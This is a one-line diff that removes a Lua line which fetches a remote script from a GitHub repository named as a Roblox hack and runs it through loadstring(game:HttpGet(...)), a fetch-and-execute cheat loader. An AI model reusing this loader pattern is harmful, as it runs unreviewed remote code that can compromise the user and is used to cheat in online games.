@@ -1,1 +1,0 @@
- loadstring(game:HttpGet('https://raw.githubusercontent.com/Teemsploit/Epic-roblox-hack/main/Zoom.lua'))()
